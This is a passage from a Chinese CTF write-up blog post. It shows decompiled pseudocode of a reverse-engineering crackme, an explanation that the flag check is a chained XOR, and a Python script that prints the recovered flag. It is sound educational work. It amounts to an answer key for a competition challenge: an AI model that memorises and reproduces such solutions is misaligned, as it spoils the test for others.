        *((_WORD *)v62 + 17) = 0;
        if ( v73 )
          v62[33] = 0;
LABEL_168:
        *(v72 - 37) = 0;
        goto LABEL_169;
      &#125;
    &#125;
    do
      --v74;
    while ( v74 );
    *((_WORD *)v62 + 17) = 0x100;
    v62[33] = 1;
    v62[35] = 0;
    v112 = 5;
LABEL_309:
    *v72 = 0;
    if ( !v112 )
    &#123;
      v116 = v72 + 2;
      goto LABEL_315;
    &#125;
    *v72 = v112;
    v113 = v72 + 2;
    *v113 = v112;
    *(v113 - 39) = v112;
    v112 = 0;
    *(v113 - 1) = 0;
    v113[1] = 0;
    while ( 2 )
    &#123;
      v113[2] = 1;
      if ( v112 )
      &#123;
        v114 = *v113;
        ++v112;
        v113[1] = 0;
        v113[2] = v112;
        v115 = v114 - 1;
        *v113 = v114 - 1;
        if ( v114 == 1 )
        &#123;
          v116 = v113 + 1;
          goto LABEL_315;
        &#125;
        goto LABEL_311;
      &#125;
      v114 = *v113;
      v115 = *v113 - 1;
      *v113 = v115;
      if ( v114 != 1 )
      &#123;
        v112 = 1;
LABEL_311:
        *++v113 = v114 - 1;
        *(v113 - 1) = v115 - v114 + 1;
        continue;
      &#125;
      break;
    &#125;
    v116 = v113 + 1;
    v112 = 1;
LABEL_315:
    if ( v116[2] )
      v116[2] = 0;
    if ( v116[3] )
    &#123;
      v117 = *(v116 - 77);
      v116[3] = 0;
      if ( v117 )
        goto LABEL_319;
    &#125;
    else
    &#123;
      v117 = *(v116 - 77);
      if ( v117 )
      &#123;
LABEL_319:
        *v116 += v117;
        *(v116 - 77) = v117;
        *((_WORD *)v116 + 1) = 0;
      &#125;
    &#125;
    v118 = v116 + 1;
    if ( v112 )
    &#123;
      while ( 1 )
      &#123;
        v119 = *(v118 - 1);
        if ( v119 )
        &#123;
          *(v118 - 2) += v119;
          *(v118 - 1) = 0;
        &#125;
        v120 = (*v118)--;
        if ( v120 == 1 )
          break;
        *--v118 = v120 - 1;
        v118[1] = 0;
      &#125;
      --v118;
    &#125;
    v122 = 0;
    if ( v118[1] )
    &#123;
      v121 = *(v118 - 40);
      v118[1] = 0;
      if ( !v121 )
        goto LABEL_327;
LABEL_326:
      *(v118 - 40) = v121;
      v122 = v121;
      goto LABEL_327;
    &#125;
    v121 = *(v118 - 40);
    if ( v121 )
      goto LABEL_326;
LABEL_327:
    v123 = v122 + 1;
    *(_WORD *)v118 = (unsigned __int8)(v122 + 1);
    if ( v122 == -1 )
      goto LABEL_333;
    v123 = 0;
    while ( 2 )
    &#123;
      v118[2] = 1;
      if ( v123 )
      &#123;
        v124 = *v118;
        ++v123;
        v118[1] = 0;
        v118[2] = v123;
        v125 = v124 - 1;
        *v118 = v124 - 1;
        if ( v124 == 1 )
        &#123;
          ++v118;
          goto LABEL_333;
        &#125;
        goto LABEL_329;
      &#125;
      v124 = *v118;
      v125 = *v118 - 1;
      *v118 = v125;
      if ( v124 != 1 )
      &#123;
        v123 = 1;
LABEL_329:
        *++v118 = v124 - 1;
        *(v118 - 1) = v125 - v124 + 1;
        continue;
      &#125;
      break;
    &#125;
    ++v118;
    v123 = 1;
LABEL_333:
    if ( v118[2] )
      v118[2] = 0;
    if ( v118[3] )
    &#123;
      v126 = *(v118 - 78);
      v118[3] = 0;
      if ( v126 )
        goto LABEL_337;
LABEL_450:
      v126 = 0;
    &#125;
    else
    &#123;
      v126 = *(v118 - 78);
      if ( !v126 )
        goto LABEL_450;
LABEL_337:
      *(v118 - 78) = v126;
      *v118 = v126;
      *((_WORD *)v118 + 1) = 0;
    &#125;
    v127 = v118 + 1;
    if ( !v123 )
      goto LABEL_342;
    while ( 2 )
    &#123;
      if ( v126 )
      &#123;
        v128 = *v127;
        v126 += *(v127 - 2);
        *(v127 - 1) = 0;
        *(v127 - 2) = v126;
        v129 = v128 - 1;
        *v127 = v128 - 1;
        if ( v128 == 1 )
          break;
        goto LABEL_341;
      &#125;
      v128 = *v127;
      v126 = *(v127 - 2);
      v129 = *v127 - 1;
      *v127 = v129;
      if ( v128 != 1 )
      &#123;
LABEL_341:
        *--v127 = v128 - 1;
        v127[1] = v129 - v128 + 1;
        continue;
      &#125;
      break;
    &#125;
    --v127;
LABEL_342:
    if ( v127[5] )
      v127[5] = 0;
    if ( v127[7] )
      v127[7] = 0;
    if ( v127[6] )
      v127[6] = 0;
    v130 = v127[3];
    v131 = *(v127 - 2);
    v132 = 0;
    v133 = 0;
    v134 = -8;
    while ( 2 )
    &#123;
      v135 = v134 + 8;
      if ( v127[4] )
        v127[4] = 0;
      if ( v130 )
        v127[3] = 0;
      if ( v127[2] )
        v127[2] = 0;
      if ( v127[1] )
        v127[1] = 0;
      v136 = v131;
      if ( v131 )
      &#123;
        v131 = 0;
        v137 = 2;
        do
        &#123;
          while ( 1 )
          &#123;
            v138 = v137;
            --v136;
            v137 = (unsigned __int8)v127[1];
            if ( (_BYTE)v138 == 1 )
            &#123;
              v139 = -1;
            &#125;
            else
            &#123;
              v137 = v138 + v137 - 1;
              v139 = v138 - 2;
              v127[1] = v137;
            &#125;
            if ( (_BYTE)v137 )
              v127[1] = 0;
            ++v132;
            if ( !(_BYTE)v139 )
              break;
            v131 -= v139;
            v140 = ~v139;
            v137 += 2 * v140 + 2;
            v127[2] = v131;
            v132 = v132 - 2 * v140 - 2;
            if ( !v136 )
              goto LABEL_365;
          &#125;
        &#125;
        while ( v136 );
LABEL_365:
        v127[3] = 0;
        v127[5] = v132;
        *(v127 - 2) = 0;
        if ( v131 )
        &#123;
          *(v127 - 2) = v131;
          v127[2] = 0;
        &#125;
      &#125;
      v141 = 0;
      if ( !v126 )
      &#123;
        LOBYTE(v143) = 2;
        if ( (_BYTE)v132 )
          goto LABEL_380;
LABEL_441:
        if ( (_BYTE)v134 != 0xF8 )
          goto LABEL_381;
        v134 = -7;
LABEL_388:
        v132 = (unsigned __int8)v127[5];
        v126 = v141;
        v130 = 0;
        continue;
      &#125;
      break;
    &#125;
    v142 = 0;
    v143 = 2;
    do
    &#123;
      while ( 1 )
      &#123;
        v144 = v143;
        --v126;
        v143 = (unsigned __int8)v127[1];
        if ( (_BYTE)v144 == 1 )
        &#123;
          v145 = -1;
        &#125;
        else
        &#123;
          v143 = v144 + v143 - 1;
          v145 = v144 - 2;
          v127[1] = v143;
        &#125;
        if ( (_BYTE)v143 )
          v127[1] = 0;
        ++v142;
        if ( !(_BYTE)v145 )
          break;
        v141 -= v145;
        v142 += 2 * v145;
        v127[2] = v141;
        v143 += 2 * ~v145 + 2;
        if ( !v126 )
          goto LABEL_375;
      &#125;
    &#125;
    while ( v126 );
LABEL_375:
    v127[3] = 0;
    v127[4] = v142;
    *(v127 - 1) = 0;
    if ( v141 )
    &#123;
      v127[2] = 0;
      *(v127 - 1) = v141;
    &#125;
    if ( (_BYTE)v142 )
    &#123;
      v132 -= v142;
      v127[4] = 0;
      v127[5] = v132;
    &#125;
    if ( !(_BYTE)v132 )
      goto LABEL_441;
LABEL_380:
    v127[5] = 0;
    v132 = 1;
    v127[3] = 1;
    if ( (_BYTE)v134 == 0xF8 )
    &#123;
      ++v133;
      v127[3] = 0;
      v134 = -7;
      v127[7] = v133;
      goto LABEL_388;
    &#125;
LABEL_381:
    v127[4] = v135;
    v146 = (unsigned __int8)v127[2];
    v127[5] = 0;
    while ( 1 )
    &#123;
      if ( (_BYTE)v132 )
      &#123;
        v146 += v132;
        *((_WORD *)v127 + 1) = (unsigned __int8)v146;
      &#125;
      if ( !(_BYTE)v146 )
        break;
      v132 = 2 * v146;
      v127[2] = 0;
      v146 = 0;
      v127[3] = v132;
      LOBYTE(v135) = v135 - 1;
      if ( !(_BYTE)v135 )
        goto LABEL_386;
    &#125;
    do
    &#123;
      LOBYTE(v135) = v135 - 1;
      v132 = v135;
    &#125;
    while ( (_BYTE)v135 );
LABEL_386:
    v127[4] = 0;
    if ( (_BYTE)v132 )
    &#123;
      v133 += v132;
      v127[3] = 0;
      v127[7] = v133;
      LOBYTE(v134) = v134 + 1;
      if ( !(_BYTE)v134 )
        goto LABEL_392;
      goto LABEL_388;
    &#125;
    LOBYTE(v134) = v134 + 1;
    if ( (_BYTE)v134 )
      goto LABEL_388;
LABEL_392:
    *v127 = v143;
    v127[6] = 0;
    if ( (_BYTE)v133 )
    &#123;
      v131 += v133;
      v127[7] = 0;
      *(v127 - 2) = v131;
    &#125;
    v147 = v127 - 4;
    if ( *(v127 - 4) )
    &#123;
      while ( 1 )
      &#123;
        if ( v141 )
          v147[3] = 0;
        if ( v131 )
        &#123;
          v147[2] = 0;
          v147[3] = v131;
        &#125;
        v148 = *++v147;
        v159 = v148 + 1;
        *v147 = v148 + 1;
        v158 = v148 + 1;
        if ( v148 != -1 )
        &#123;
          *v147 = 0;
          v147[1] = v159;
        &#125;
        v149 = *(v147 - 1) - 1;
        *(v147 - 1) = v149;
        if ( !v149 )
          break;
        *v147 = v149;
        v141 = v147[3];
        *(v147 - 1) = 0;
      &#125;
      v141 = v147[3];
    &#125;
    else
    &#123;
      v158 = *(v127 - 3);
      v159 = v158;
    &#125;
    if ( v141 )
      v147[3] = 0;
    if ( *(v147 - 75) )
      *(v147 - 75) = 0;
    if ( v131 )
    &#123;
      *(v147 - 75) = v131;
      *v147 = v131;
      *((_WORD *)v147 + 1) = 0;
    &#125;
    v150 = v147 + 1;
    if ( v158 )
    &#123;
      while ( 1 )
      &#123;
        if ( v131 )
        &#123;
          v151 = *v150;
          v131 += *(v150 - 2);
          *(v150 - 1) = 0;
          *(v150 - 2) = v131;
          v152 = v151 - 1;
          *v150 = v151 - 1;
          if ( v151 == 1 )
            goto LABEL_417;
        &#125;
        else
        &#123;
          v153 = *v150;
          v131 = *(v150 - 2);
          v152 = *v150 - 1;
          *v150 = v152;
          if ( v153 == 1 )
          &#123;
LABEL_417:
            --v150;
            v159 = 0;
            break;
          &#125;
        &#125;
        *--v150 = v152;
        v150[1] = 0;
      &#125;
    &#125;
    if ( v131 )
      *(v150 - 1) = 0;
    v154 = *(v150 - 38);
    if ( v154 )
    &#123;
      v155 = v154 + 1;
      *(v150 - 1) = v154;
      *(v150 - 38) = 0;
      *v150 = v154 + 1;
      if ( v154 == -1 )
      &#123;
        *(v150 - 1) = 0;
        v112 = 0;
      &#125;
      else
      &#123;
        *v150 = 0;
        *(v150 - 38) = v155;
        *(v150 - 1) = 0;
LABEL_423:
        *(v150 - 1) = v155;
        *(v150 - 38) = 0;
        if ( v155 )
        &#123;
          *(v150 - 38) = v155;
          v112 = v155;
        &#125;
        else
        &#123;
          v112 = 0;
        &#125;
      &#125;
    &#125;
    else
    &#123;
      v155 = v159 + 1;
      *v150 = v159 + 1;
      if ( v159 != -1 )
        goto LABEL_423;
      v112 = 0;
    &#125;
    v4 = v150[2] == 0;
    *(_WORD *)v150 = 36;
    if ( !v4 )
      v150[2] = 0;
    v156 = 36;
    do
    &#123;
      if ( v155 )
      &#123;
LABEL_429:
        *(v150 - 1) = 0;
        v150[2] = v155;
        *(v150 - 1) = v155;
        v157 = v155;
      &#125;
      else
      &#123;
        v157 = 0;
      &#125;
      if ( !v157 )
      &#123;
        while ( --v156 )
        &#123;
          if ( v155 )
            goto LABEL_429;
        &#125;
        *(_WORD *)v150 = 256;
        v72 = v150 - 1;
        *v72 = 1;
        v72[2] = 0;
        goto LABEL_309;
      &#125;
      --v155;
      v150[2] = 0;
      *(v150 - 1) = v155;
      --v156;
    &#125;
    while ( v156 );
    *(_WORD *)v150 = 0;
    if ( v155 )
      *(v150 - 1) = 0;
    v72 = v150 - 1;
    if ( v112 )
      goto LABEL_168;
LABEL_169:
    v72[2] = 0;
    *(_WORD *)v72 = 1;
LABEL_170:
    v75 = *(v72 - 37);
    *v72 = 5;
    if ( v75 )
    &#123;
      v76 = v75 + 5;
      *v72 = v76;
      *(_WORD *)(v72 + 1) = 0;
      if ( !v76 )
        goto LABEL_178;
    &#125;
    v77 = v72;
    v76 = 0;
    while ( 2 )
    &#123;
      v72[2] = 1;
      if ( v76 )
      &#123;
        v78 = *v72;
        ++v76;
        v72[1] = 0;
        v72[2] = v76;
        v79 = v78 - 1;
        *v72 = v78 - 1;
        if ( v78 == 1 )
        &#123;
          ++v72;
          goto LABEL_176;
        &#125;
        goto LABEL_175;
      &#125;
      v78 = *v72;
      v79 = *v72 - 1;
      *v72 = v79;
      if ( v78 != 1 )
      &#123;
        v76 = 1;
LABEL_175:
        *++v72 = v78 - 1;
        *(v72 - 1) = v79 - v78 + 1;
        v77 = v72;
        continue;
      &#125;
      break;
    &#125;
    ++v72;
    v76 = 1;
LABEL_176:
    if ( v77[3] )
      v72[2] = 0;
LABEL_178:
    if ( v72[3] )
    &#123;
      v80 = *(v72 - 75);
      v72[3] = 0;
      if ( v80 )
        goto LABEL_180;
    &#125;
    else
    &#123;
      v80 = *(v72 - 75);
      if ( v80 )
      &#123;
LABEL_180:
        *v72 += v80;
        *(v72 - 75) = v80;
        *((_WORD *)v72 + 1) = 0;
      &#125;
    &#125;
    v81 = v72 + 1;
    if ( v76 )
    &#123;
      while ( 1 )
      &#123;
        v82 = *(v81 - 1);
        if ( v82 )
        &#123;
          *(v81 - 2) += v82;
          *(v81 - 1) = 0;
        &#125;
        v83 = *v81;
        v84 = *v81 - 1;
        *v81 = v84;
        if ( v83 == 1 )
          break;
        *--v81 = v83 - 1;
        v81[1] = v84 - v83 + 1;
      &#125;
      --v81;
    &#125;
    if ( v81[1] )
    &#123;
      v85 = *(v81 - 38);
      v81[1] = 0;
      if ( v85 )
        goto LABEL_188;
LABEL_264:
      v86 = 0;
      goto LABEL_193;
    &#125;
    v85 = *(v81 - 38);
    if ( !v85 )
      goto LABEL_264;
LABEL_188:
    *v81 = v85;
    v86 = 0;
    *(v81 - 38) = v85;
    v81[1] = 0;
    while ( 2 )
    &#123;
      v81[2] = 1;
      if ( v86 )
      &#123;
        v87 = *v81;
        ++v86;
        v81[1] = 0;
        v81[2] = v86;
        v88 = v87 - 1;
        *v81 = v87 - 1;
        if ( v87 == 1 )
        &#123;
          ++v81;
          goto LABEL_193;
        &#125;
        goto LABEL_189;
      &#125;
      v87 = *v81;
      v88 = *v81 - 1;
      *v81 = v88;
      if ( v87 != 1 )
      &#123;
        v86 = 1;
LABEL_189:
        *++v81 = v87 - 1;
        *(v81 - 1) = v88 - v87 + 1;
        continue;
      &#125;
      break;
    &#125;
    ++v81;
    v86 = 1;
LABEL_193:
    if ( v81[2] )
      v81[2] = 0;
    if ( v81[3] )
    &#123;
      v89 = *(v81 - 33);
      v81[3] = 0;
      if ( v89 )
        goto LABEL_197;
LABEL_276:
      v89 = 0;
    &#125;
    else
    &#123;
      v89 = *(v81 - 33);
      if ( !v89 )
        goto LABEL_276;
LABEL_197:
      *(v81 - 33) = v89;
      *v81 = v89;
      *((_WORD *)v81 + 1) = 0;
    &#125;
    v90 = v81 + 1;
    if ( !v86 )
      goto LABEL_202;
    while ( 2 )
    &#123;
      if ( v89 )
      &#123;
        v91 = *v90;
        v89 += *(v90 - 2);
        *(v90 - 1) = 0;
        *(v90 - 2) = v89;
        v92 = v91 - 1;
        *v90 = v91 - 1;
        if ( v91 == 1 )
          break;
        goto LABEL_201;
      &#125;
      v91 = *v90;
      v89 = *(v90 - 2);
      v92 = *v90 - 1;
      *v90 = v92;
      if ( v91 != 1 )
      &#123;
LABEL_201:
        *--v90 = v91 - 1;
        v90[1] = v92 - v91 + 1;
        continue;
      &#125;
      break;
    &#125;
    --v90;
LABEL_202:
    v93 = *(v90 - 2);
    v72 = v90 - 2;
    if ( v93 )
    &#123;
      v94 = v89 - v93;
      *(v90 - 2) = 0;
      *(v90 - 1) = v94;
      if ( v94 )
        goto LABEL_204;
    &#125;
    else if ( v89 )
    &#123;
LABEL_204:
      v4 = v90[1] == 0;
      *(v90 - 1) = 0;
      if ( !v4 )
        v90[1] = 0;
      if ( *(v90 - 38) )
        *(v90 - 38) = 0;
    &#125;
    v95 = *(v90 - 39);
    if ( v95 )
    &#123;
      v96 = v95 + 1;
      *(v90 - 39) = 0;
      *(v90 - 1) = v96;
      if ( v96 )
        goto LABEL_210;
      *(v90 - 2) = 0;
    &#125;
    else
    &#123;
      v96 = 1;
LABEL_210:
      *(v90 - 2) = v96;
      *(v90 - 39) = v96;
    &#125;
    v4 = v90[1] == 0;
    *v90 = 0;
    *(v90 - 1) = 32;
    if ( !v4 )
      v90[1] = 0;
    v97 = 32;
    do
    &#123;
      if ( !v96 )
      &#123;
        do
          --v97;
        while ( v97 );
        *v90 = 1;
        *(v90 - 1) = 0;
        *(v90 - 2) = 1;
        *v90 = 0;
        goto LABEL_170;
      &#125;
      *(v90 - 2) = 0;
      v90[1] = v96;
      *(v90 - 2) = v96--;
      v90[1] = 0;
      *(v90 - 2) = v96;
      --v97;
    &#125;
    while ( v97 );
    *v90 = 0;
    *(v90 - 1) = 0;
    if ( v96 )
      *(v90 - 2) = 0;
    v98 = *(v90 - 38);
    v99 = *(v90 - 2);
    if ( v98 )
    &#123;
      v99 += v98;
      *(v90 - 2) = v99;
    &#125;
    if ( v99 )
    &#123;
      *(v90 - 1) = 0;
      putc(&#39;C&#39;, _bss_start);
      putc(&#39;o&#39;, _bss_start);
      putc(&#39;n&#39;, _bss_start);
      putc(&#39;g&#39;, _bss_start);
      putc(&#39;r&#39;, _bss_start);
      putc(&#39;a&#39;, _bss_start);
      putc(&#39;t&#39;, _bss_start);
      putc(&#39;s&#39;, _bss_start);
      v100 = _bss_start;
      *(_WORD *)v90 = 33;
      putc(&#39;!&#39;, v100);
      *(v90 - 2) = 0;
    &#125;
    else
    &#123;
      *(v90 - 1) = 1;
      do
      &#123;
        putc(&#39;n&#39;, _bss_start);
        putc(&#39;o&#39;, _bss_start);
        putc(&#39;n&#39;, _bss_start);
        putc(&#39;o&#39;, _bss_start);
        putc(&#39;n&#39;, _bss_start);
        *(_WORD *)v90 = &#39;o&#39;;
        putc(&#39;o&#39;, _bss_start);
        v4 = (*(v90 - 1))-- == 1;
      &#125;
      while ( !v4 );
    &#125;
    v4 = (*(v90 - 35))-- == 1;
    v62 = v90 - 35;
    if ( !v4 )
      continue;
    return 0;
  &#125;
&#125;
</code></pre>
<p>虽然还有较多的无用代码，但是已经可以看到程序的大致流程，输入之后判断是否为<code>flag&#123;***&#125;</code>格式，然后进行正确性检验，和已知数据进行对比，正确输出<code>Congrats!</code>，错误输出<code>nonono</code>。</p>
<h4 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>通过调试其实可以发现程序的主要执行逻辑就是与后一位异或，代码中的体现就是两数不停除2，找到每一位的数为1或是0，如两数第n位相同则结果不变，体现到二进制上就是最终结果的第n位为0，不同则结果加<code>2^n</code>，体现到二进制上就是最终结果的第n位为1</p>
<p>知道算法是异或之后很容易解出来flag</p>
<pre><code class="python">target = [0x53, 0x0F, 0x5A, 0x54, 0x50, 0x55, 0x03, 0x02, 0x00, 0x07, 0x56, 0x07, 0x07, 0x5B, 0x09,
          0x00, 0x50, 0x05, 0x02, 0x03, 0x5D, 0x5C, 0x50, 0x51, 0x52, 0x54, 0x5A, 0x5F, 0x02, 0x57, 0x07, 0x34]

for i in range(len(target)-1, 0, -1):
    target[i-1] ^= target[i]

flag = &#39;flag&#123;&#39;+&quot;&quot;.join([chr(i) for i in target])+&#39;&#125;&#39;
print(flag)
# flag&#123;d78b6f30225cdc811adfe8d4e7c9fd34&#125;
</code></pre>
<h3 id="babyruby"><a href="#babyruby" class="headerlink" title="babyruby"></a>babyruby</h3><blockquote>
<p>当时硬逆了很久mruby的字节码，只有AAA唯一解，有时间复现一下</p>
</blockquote>
<h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="capp"><a href="#capp" class="headerlink" title="capp"></a>capp</h3><blockquote>
<p>抽空复现</p>
</blockquote>
<h3 id="uniapp"><a href="#uniapp" class="headerlink" title="uniapp"></a>uniapp</h3><blockquote>
<p>抽空复现</p>
</blockquote>

          
            <div class='article_footer'>
              
                
  
    
    



  

  
    
    



  

  
    
    

<section class="widget copyright  desktop mobile">
  <div class='content'>
    
      <blockquote>
        
          
            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>

          
        
          
            <p>本文永久链接是：<a href=http://blog.rycbar.club/2021/10/05/wp-5space-2021/>http://blog.rycbar.club/2021/10/05/wp-5space-2021/</a></p>
          
        
      </blockquote>
    
  </div>
</section>

  

  


              
            </div>
          
        </div>
        
          


  <section class='meta' id="footer-meta">
    <div class='new-meta-box'>
      
        
          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-10-05T20:03:50+08:00">
  <a class='notlink'>
    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
    <p>更新于：2021年10月5日</p>
  </a>
</div>

        
      
        
          
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/5space/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>5space</p></a></div>


        
      
        
          

        
      
        
          
  <div class="new-meta-item share -mob-share-list">
  <div class="-mob-share-list share-body">
    
      
        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.rycbar.club/2021/10/05/wp-5space-2021/&title=wp-5space-2021 - My Tiny Ideas&summary=第五空间2021，忙完之后终于有时间梳理一下之前做题的思路和复现一下当时没有解出来的题目。"
          
          >
          
            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qq.png">
          
        </a>
      
    
      
        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.rycbar.club/2021/10/05/wp-5space-2021/&title=wp-5space-2021 - My Tiny Ideas&summary=第五空间2021，忙完之后终于有时间梳理一下之前做题的思路和复现一下当时没有解出来的题目。"
          
          >
          
            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qzone.png">
          
        </a>
      
    
      
        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="http://service.weibo.com/share/share.php?url=http://blog.rycbar.club/2021/10/05/wp-5space-2021/&title=wp-5space-2021 - My Tiny Ideas&summary=第五空间2021，忙完之后终于有时间梳理一下之前做题的思路和复现一下当时没有解出来的题目。"
          
          >
          
            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/weibo.png">
          
        </a>
      
    
  </div>
</div>



        
      
    </div>
  </section>


        
        
          <div class="prev-next">
            
            
              <a class='next' href='/2021/05/16/2021-05-16-2021_ciscn_Re%E9%83%A8%E5%88%86wp/'>
                <p class='title'>2021 ciscn Re部分wp<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
                <p class='content'>2021 ciscn Re部分wp


glassjava层没什么多余的调用，直接native调用checkflag
bool __fastcall Java_com_ciscn_glass_M...</p>
              </a>
            
          </div>
        
      </section>
    </article>
  

  
    <!-- 显示推荐文章和评论 -->



  <article class="post white-box reveal comments shadow">
    <section class="article typo">
      <p ct><i class='fas fa-comments'></i> 评论</p>
      
      
      
      
        <section id="comments">
          <div id="gitalk-container"></div>
        </section>
      
      
      
      
    </section>
  </article>


  




<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->



  <script>
    window.subData = {
      title: 'wp-5space-2021',
      tools: true
    }
  </script>


</div>
<aside class='l_side'>
  
  

  
    
    


  <section class="widget toc-wrapper shadow desktop mobile">
    
  <header>
    
      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
    
  </header>


    <div class='content'>
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bountyhunter"><span class="toc-text">bountyhunter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re"><span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#StrangeLanguage"><span class="toc-text">StrangeLanguage</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%8C%85"><span class="toc-text">解包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-text">反编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-text">程序逻辑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyruby"><span class="toc-text">babyruby</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mobile"><span class="toc-text">Mobile</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#capp"><span class="toc-text">capp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uniapp"><span class="toc-text">uniapp</span></a></li></ol></li></ol>
    </div>
  </section>


  


</aside>


  
  <footer class="clearfix">
    <br><br>
    
      
        <div class="aplayer-container">
          

  
    <meting-js
      theme='#1BCDFC'
      autoplay='false'
      volume='0.7'
      loop='all'
      order='random'
      fixed='false'
      list-max-height='340px'
      server='netease'
      type='playlist'
      id='555017395'
      list-folded='true'>
    </meting-js>
  


        </div>
      
    
      
        <br>
        <div class="social-wrapper">
          
            
              <a href="/rycbar17th@gmail.com"
                class="social fas fa-envelope flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
            
              <a href="https://github.com/rycbar77"
                class="social fab fa-github flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
        </div>
      
    
      
        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
</div>
      
    
      
        <div class='copyright'>
        <p><a href="https://blog.rycbar.club/">Copyright © 2017-2020 rycbar</a></p>

        </div>
      
    
  </footer>

<script>setLoadingBarProgress(80);</script>


      <script>setLoadingBarProgress(60);</script>
    </div>
    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
  </div>
  
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>


  <script>
    
    var SEARCH_SERVICE = "hexo" || "hexo";
    var ROOT = "/" || "/";
    if (!ROOT.endsWith('/')) ROOT += '/';
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>


  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
  <script type="text/javascript">
    $(function() {
      ScrollReveal().reveal('.l_main .reveal', {
        distance: '8px',
        duration: '800',
        interval: '100',
        scale: '1'
      });
    });
  </script>


  
<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>

  <script type="text/javascript">
    $(function() {
      Waves.attach('.flat-btn', ['waves-button']);
      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
      Waves.attach('.flat-box', ['waves-block']);
      Waves.attach('.float-box', ['waves-block', 'waves-float']);
      Waves.attach('.waves-image');
      Waves.init();
    });
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>



  
  
  
    
<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>

    <script type="text/javascript">
      $(function(){
        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/BBC19066-E176-47C2-9D22-48C81EE5DF6B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/35F12181-F0E9-45BD-B134-37E4B4A660CF.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B951AE18-D431-417F-B3FE-A382403FF21B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/AEB33F9D-7294-4CF1-B8C5-3020748A9D45.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/2884F904-F1F3-479E-AE27-5EBC291B63B0.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/10A0FCE5-36A1-4AD0-8CF0-019259A89E03.jpeg", 